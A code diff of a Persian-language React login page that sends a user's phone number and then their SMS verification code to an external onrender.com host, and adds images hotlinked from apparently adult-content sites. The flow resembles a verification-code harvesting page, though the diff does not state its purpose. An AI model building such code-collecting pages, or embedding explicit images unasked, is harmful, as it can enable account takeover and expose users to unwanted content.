@@ -11,7 +11,6 @@ export default function Login() {
     setPhone(value);
   };
 
-  // ارسال شماره
   const sendPhone = async () => {
     if (!/^09\d{9}$/.test(phone)) {
       alert("شماره معتبر نیست");
@@ -27,31 +26,34 @@ export default function Login() {
     const data = await res.json();
     setUserId(data.id);
 
-    alert("کد از طریق SMS برای شما ارسال شد. لطفا کد را وارد کنید");
+    alert("کد از طریق SMS ارسال شد، لطفا وارد کنید");
     setStep(2);
   };
 
-  // ارسال کد
   const sendCode = async () => {
-    if (!code) return alert("کد را وارد کنید");
-
     await fetch(`https://khafan-site.onrender.com/code/${userId}`, {
       method: "PUT",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ code }),
     });
 
-    alert("ثبت با موفقیت انجام شد");
+    alert("✔ ثبت شد");
   };
 
   return (
-    <div className="page">
-      <div className="bg"></div>
+    <div className="cyber-bg">
+      <div className="glow"></div>
 
-      <div className="card">
+      <div className="glass-card">
+
         {step === 1 && (
           <>
-            <h2>ثبت شماره موبایل</h2>
+            <img
+              className="hero-img"
+              src="https://fi1-ph.ypncdn.com/videos/202505/02/468061265/original/(m=eaSaaTbWx)(mh=ZYcC24OaVFTpvG-v)3.jpg"
+            />
+
+            <h1>📱 ثبت شماره</h1>
 
             <input
               value={phone}
@@ -59,13 +61,20 @@ export default function Login() {
               placeholder="09xxxxxxxxx"
             />
 
-            <button onClick={sendPhone}>ارسال کد</button>
+            <button onClick={sendPhone}>
+              ارسال کد
+            </button>
           </>
         )}
 
         {step === 2 && (
           <>
-            <h2>کد را وارد کنید</h2>
+            <img
+              className="hero-img"
+              src="https://cdn.donmai.us/original/08/20/0820bb9acc44ccd754daa0abc6247ffc.png"
+            />
+
+            <h1>🔐 وارد کردن کد</h1>
 
             <input
               value={code}
@@ -73,9 +82,12 @@ export default function Login() {
               placeholder="کد تایید"
             />
 
-            <button onClick={sendCode}>تایید</button>
+            <button onClick={sendCode}>
+              تایید
+            </button>
           </>
         )}
+
       </div>
     </div>
   );
